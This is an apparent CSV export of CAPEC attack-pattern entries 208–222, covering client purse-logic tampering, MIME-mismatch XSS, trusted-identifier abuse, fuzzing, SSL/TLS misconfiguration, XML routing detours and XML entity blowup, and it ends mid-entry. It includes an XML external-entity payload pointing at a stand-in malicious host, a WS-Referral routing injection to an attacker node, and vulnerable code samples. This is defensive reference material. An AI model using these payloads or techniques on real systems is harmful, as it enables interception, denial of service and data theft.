208,"Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",Detailed,Draft,"An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.","",,Medium,"::NATURE:ChildOf:CAPEC ID:207::","","::The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations.::","","::The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.::","","","","","::602::","","",
209,"XSS Using MIME Type Mismatch",Detailed,Draft,"An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.","",,Medium,"::NATURE:ChildOf:CAPEC ID:592::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all areas that allow a user to upload content through an HTTP POST request. This is typically found in blogs or forums.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to file upload features:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for MIME type mismatch] The adversary uses the entry points gathered in the Explore phase as a target list and uploads files with scripting content, but whose MIME type is specified as a file type that cannot execute scripting content. If the application only checks the MIME type of the file, it may let the file through, causing the script to be executed by any user who accesses the file.:TECHNIQUE:Upload a script file with a MIME type of text/plain to a forum and then access the uploaded file to see if the script is executed. If possible, the script displays a unique identifier so the adversary knows for certain it was executed when testing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Store malicious XSS content] Once the adversary has determined which file upload locations are vulnerable to MIME type mismatch, they will upload a malicious script disguised as a non scripting file. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.:TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.:TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::","::The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.::The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.::","","::The adversary must have the ability to source the file of the incorrect MIME type containing a script.::","","","","::For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.::In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.::","::79::20::646::","","",
21,"Exploitation of Trusted Identifiers",Meta,Stable,"An adversary guesses, obtains, or rides a trusted identifier (e.g. session ID, resource ID, cookie, etc.) to perform authorized actions under the guise of an authenticated user or service.","",High,High,"","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for Indicators of Susceptibility] Using a variety of methods, until one is found that applies to the target, the adversary probes for cookies, session tokens, or entry points that bypass identifiers altogether.:TECHNIQUE:Spider all available pages:TECHNIQUE:Attack known bad interfaces:TECHNIQUE:Search outward-facing configuration and properties files for identifiers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Fetch samples] The adversary fetches many samples of identifiers. This may be through legitimate access (logging in, legitimate connections, etc.) or via systematic probing.:TECHNIQUE:An adversary makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An adversary makes authorized connections and records the session tokens or credentials issued.:TECHNIQUE:An adversary gains access to (legitimately or illegitimately) a nearby system (e.g., in the same operations network, DMZ, or local network) and makes a connection from it, attempting to gain the same privileges as a trusted system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::","::Server software must rely on weak identifier proof and/or verification schemes.::Identifiers must have long lifetimes and potential for reusability.::Server software must allow concurrent sessions to exist.::","::SKILL:To achieve a direct connection with the weak or non-existent server session access control, and pose as an authorized user:LEVEL:Low::","::Ability to deploy software on network.::Ability to communicate synchronously or asynchronously with server.::","","::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.::Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.::Implementation: If the identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.::Implementation: If the web or application server supports it, then encrypting and/or signing the identifier (such as cookie) can protect the ID if intercepted.::Design: Use strong session identifiers that are protected in transit and at rest.::Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.::Implementation: Verify authenticity of all identifiers at runtime.::","::Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an adversary to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an adversary to exploit session IDs. A brute force attack involves an adversary repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an adversary can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The adversary can then use these variables and access the application.::For example, in a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or the process that wrote the message to the queue is authentic and authorized to do so.::","::290::302::346::539::6::384::664::602::642::","TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::::TAXONOMY NAME:ATTACK:ENTRY ID:1528:ENTRY NAME:Steal Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1539:ENTRY NAME:Steal Web Session Cookie::","",
211,"DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",Detailed,Deprecated,"This attack pattern has been deprecated as it was deemed not to be a legitimate attack pattern.","",,,"","","","","","","","","","","","",
212,"Functionality Misuse",Meta,Stable,"An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.","",Medium,Medium,"","","::The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.::","::SKILL:General computer knowledge about how applications are launched, how they interact with input/output, and how they are configured.:LEVEL:Low::","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful attack of this kind can compromise the confidentiality of an authorized user's credentials.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Depending on the adversary's intended technical impact, a successful attack of this kind can compromise any or all elements of the security triad.::","::Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.::When implementing security features, consider how they can be misused and compromised.::","","::1242::1246::1281::","","",
213,"DEPRECATED: Directory Traversal",Standard,Deprecated,"This attack pattern has been deprecated as it is a duplicate of the existing attack pattern CAPEC-126 : Path Traversal. Please refer to this other CAPEC going forward.","",,,"","","","","","","","","","","","",
214,"DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",Detailed,Deprecated,"This attack pattern has been deprecated as it was merged into CAPEC-215 : Fuzzing for application mapping. Please refer to this other CAPEC going forward.","",,,"","","","","","","","","","","","",
215,"Fuzzing for application mapping",Detailed,Draft,"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash.","",High,Low,"::NATURE:ChildOf:CAPEC ID:54::NATURE:ChildOf:CAPEC ID:28::","::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.:TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.:TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that might provide information to map the application::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] An adversary usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the adversary may try changing the origin IP addresses or client browser identification strings or start a new session from where they left off in obfuscating the attack.:TECHNIQUE:Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.:TECHNIQUE:If the application rejects the large amount of fuzzing messages from the same host machine, the adversary needs to hide the attacks by changing the IP addresses or other credentials.::","::The target application must fail to sanitize incoming messages adequately before processing.::","::SKILL:Although fuzzing parameters is not difficult, and often possible with automated fuzzing tools, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.:LEVEL:Medium::","::Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::","::Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.::Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.::Implementation: Obfuscate server fields of HTTP response.::Implementation: Hide inner ordering of HTTP response header.::Implementation: Customizing HTTP error codes such as 404 or 500.::Implementation: Hide HTTP response header software information filed.::Implementation: Hide cookie's software information filed.::Implementation: Obfuscate database type in Database API's error message.::","::The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.::In languages that utilize stack traces, revealing them can give adversaries information that allows them to map functions and file locations for an application. The following Java method prints out a stack trace that exposes the application to this attack pattern. public void httpGet(HttpServletRequest request, HttpServletResponse response) {try {processRequest();} catch (Exception ex) {ex.printStackTrace(response.getWriter()); return;}} If this code is running on a server, such as a web application, then the adversary could cause the exception to be printed through fuzzing.::","::209::532::","","",
216,"Communication Channel Manipulation",Meta,Stable,"An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.","",,,"::NATURE:CanPrecede:CAPEC ID:94::","","::The target application must leverage an open communications channel.::The channel on which the target communicates must be vulnerable to interception (e.g., adversary in the middle attack - CAPEC-94).::","","::A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Other:NOTE:The adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel.::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful Communication Channel Manipulation attack can result in sensitive information exposure to the adversary, thereby compromising the communication channel's confidentiality.::","::Encrypt all sensitive communications using properly-configured cryptography.::Design the communication system such that it associates proper authentication/authorization with each channel/message.::","","::306::","","",
217,"Exploiting Incorrectly Configured SSL/TLS",Standard,Draft,"An adversary takes advantage of incorrectly configured SSL/TLS communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.","",Low,,"::NATURE:ChildOf:CAPEC ID:216::","::STEP:1:PHASE:Explore:DESCRIPTION:[Determine SSL/TLS Configuration] Determine the SSL/TLS configuration of either the server or client being targeted, preferably both. This is not a hard requirement, as the adversary can simply assume commonly exploitable configuration settings and indiscriminately attempt them.:TECHNIQUE:If the target is a webpage, some of the SSL/TLS configuration can be viewed through the browser's security information, such as the key sizes and cipher being used.::STEP:2:PHASE:Experiment:DESCRIPTION:[Intercept Communication] Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. AiTM (adversary in the middle - CAPEC-94).:TECHNIQUE:Create a malicious webpage that looks identical to the target webpage, but routes client traffic to the server such that the adversary can observe the traffic and perform an adverary in the middle attack.:TECHNIQUE:If the adversary has access to the network that either the client or server is on, the can attempt to use a packet sniffer to perform an adversary in the middle attack.:TECHNIQUE:Install a packet sniffer through malware directly to a client device that can intercept SSL/TLS traffic and perform an adversary in the middle attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture or Manipulate Sensitive Data] Once the adversary has the ability to intercept the secure communication, they exploit the incorrectly configured SSL to view the encrypted communication. The adversary can choose to just record the secure communication or manipulate the data to achieve a desired effect.:TECHNIQUE:Use known exploits for old SSL and TLS versions.:TECHNIQUE:Use known exploits for weak ciphers such as DES and RC4.::","::Access to the client/server stream.::","::SKILL:The adversary needs real-time access to network traffic in such a manner that the adversary can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.:LEVEL:High::","::The adversary needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Do not use SSL, as all SSL versions have been broken and should not be used. If TLS is not an option for the client or server, consider setting timeouts on SSL sessions to extremely low values to lessen the potential impact.::Only use TLS version 1.2+, as versions 1.0 and 1.1 are insecure.::Configure TLS to use secure algorithms. The current recommendation is to use ECDH, ECDSA, AES256-GCM, and SHA384 for the most security.::","::Using MITM techniques, an adversary launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the adversary to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.::","::201::","","",
218,"Spoofing of UDDI/ebXML Messages",Detailed,Draft,"An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.","",,Medium,"::NATURE:ChildOf:CAPEC ID:148::","","::The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.::","","::The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.::","","","::Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party.::","","::345::","","",
219,"XML Routing Detour Attacks",Standard,Draft,"An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Adversary in the Middle type attacks (CAPEC-94). The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of their choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.","",High,Medium,"::NATURE:ChildOf:CAPEC ID:94::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using command line or an automated tool, an attacker records all instances of web services to process XML requests.:TECHNIQUE:Use automated tool to record all instances to process XML requests or find exposed WSDL.:TECHNIQUE:Use tools to crawl WSDL::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify SOAP messages that have multiple state processing.] Inspect instance to see whether the XML processing has multiple stages or not.:TECHNIQUE:Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).:TECHNIQUE:The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message::","::The targeted system must have multiple stages processing of XML content.::","::SKILL:To inject a bogus node in the XML routing table:LEVEL:Low::","::The attacker must be able to insert or compromise a system into the processing path for the transaction.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.::Implementation: Use SSL for connections between all parties with mutual authentication.::","::Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction). Example SOAP message with routing information in header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd> <m:via>http://example2.com/router</m:via> </m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Add an additional node (example3.com/router) to the XML path in a WS-Referral message <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://example3.com/router</r:via></r:go></r:ref> Resulting in the following SOAP Header: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example1.com/</m:action> <m:to>http://example4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Continuing with this example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that they have targeted. Example of WS-Referral based WS-Routing injection of the bogus node route: <r:ref xmlns:r=http://schemas.example.com/referral><r:for><r:prefix>http://example2.com/router</r:prefix></r:for> <r:if/> <r:go><r:via>http://evilsite1.com/router</r:via></r:go></r:ref> Resulting XML Routing Detour attack: <S:Envelope><S:Header><m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1><m:action>http://example_0.com/</m:action> <m:to>http://example_4.com/router</m:to> <m:id>uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f</m:id> <m:fwd><m:via>http://example2.com/router</m:via> <m:via>http://evilesite1.com/router</m:via> <m:via>http://example3.com/router</m:via></m:fwd> <m:rev /></m:path></S:Header> <S:Body>...</S:Body></S:Envelope> Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).::","::441::610::","TAXONOMY NAME:WASC:ENTRY ID:32:ENTRY NAME:Routing Detour::::TAXONOMY NAME:WASC:ENTRY ID:44:ENTRY NAME:XML Entity Expansion::","",
22,"Exploiting Trust in Client",Meta,Draft,"An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.","",High,High,"","","::Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.::","::SKILL:The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars:LEVEL:Medium::","::Ability to communicate synchronously or asynchronously with server::","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.::Design: Do not rely on client validation or encoding for security purposes.::Design: Utilize digital signatures to increase authentication assurance.::Design: Utilize two factor authentication to increase authentication assurance.::Implementation: Perform input validation for all remote content.::","::Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.::Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.::Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.::Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.::","::290::287::20::200::693::","","",
220,"Client-Server Protocol Manipulation",Standard,Draft,"An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions.","",,Medium,"::NATURE:ChildOf:CAPEC ID:272::","","::The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.::","","::The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.::","","","","","::757::","","",
221,"Data Serialization External Entities Blowup",Detailed,Draft,"This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.","",,,"::NATURE:ChildOf:CAPEC ID:231::NATURE:ChildOf:CAPEC ID:278::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.::STEP:2:PHASE:Experiment:DESCRIPTION:[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.::STEP:4:PHASE:Exploit:DESCRIPTION:[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.::","::A server that has an implementation that accepts entities containing URI values.::","","","","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::","::This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::","::In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>::","::611::","TAXONOMY NAME:WASC:ENTRY ID:43:ENTRY NAME:XML External Entities::","",
222,"iFrame Overlay",Detailed,Draft,"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:103::","::STEP:1:PHASE:Explore:DESCRIPTION:[Craft an iFrame Overlay page] The adversary crafts a malicious iFrame overlay page.:TECHNIQUE:The adversary leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.::STEP:2:PHASE:Exploit:DESCRIPTION:[adversary tricks victim to load the iFrame overlay page] adversary utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.:TECHNIQUE:Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Trick the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the iFrame overlay page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.:TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::","::The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.::","::SKILL:Crafting the proper malicious site and luring the victim to this site is not a trivial task.:LEVEL:High::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL 